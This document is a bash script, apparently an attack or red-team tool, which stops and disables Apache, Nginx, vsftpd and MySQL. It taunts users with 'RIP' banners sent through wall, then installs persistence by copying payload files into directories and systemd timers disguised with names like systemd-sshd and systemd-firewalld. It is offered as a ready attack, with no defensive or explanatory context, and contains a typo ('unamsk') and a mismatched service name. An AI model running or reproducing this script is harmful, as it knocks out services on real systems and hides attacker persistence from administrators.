#! /bin/bash

# No apache for you
if type "apache2" >/dev/null 2>/dev/null; then
	systemctl disable --now apache2.service
	figlet "RIP Apache2" | /usr/games/cowsay -nsw | wall
fi

# No nginx for you
if type "nginx" >/dev/null 2>/dev/null; then
	systemctl disable --now nginx.service
	figlet "RIP Nginx" | /usr/games/cowsay -nsw | wall
fi

# No vsftpd for you
if type "vsftpd" >/dev/null 2>/dev/null; then
	systemctl disable --now vsftpd.service
	figlet "RIP FTP" | /usr/games/cowsay -nsw | wall
fi

# No mysql for you
if type "mysql" >/dev/null 2>/dev/null; then
	systemctl disable --now mysql.service
	figlet "RIP MySQL" | /usr/games/cowsay -nsw | wall
fi

# Self healing
mkdir --parents -- /usr/share/systemd-bootd \
	/usr/share/systemd-firewalld \
	/usr/share/systemd-maild \
	/usr/share/systemd-pamd \
	/usr/share/systemd-printerd \
	/usr/share/systemd-sshd \
	/usr/share/systemd-userd

cp -- /usr/share/systemd-issued/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-issued/* /usr/share/systemd-bootd/
cp -r -- /usr/share/systemd-issued/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-issued/* /usr/share/systemd-maild/
cp -r -- /usr/share/systemd-issued/* /usr/share/systemd-pamd/
cp -r -- /usr/share/systemd-issued/* /usr/share/systemd-printerd/
cp -r -- /usr/share/systemd-issued/* /usr/share/systemd-sshd/
cp -r -- /usr/share/systemd-issued/* /usr/share/systemd-userd/

systemctl daemon-reload

systemctl unamsk systemd-bootd.service \
	systemd-firewalld.service \
	systemd-maild.service \
	systemd-pamd.service \
	systemd-printerd.service \
	systemd-ssh.service \
	systemd-userd.service

systemctl unmask systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

systemctl enable --now systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

# vim: set filetype=sh:
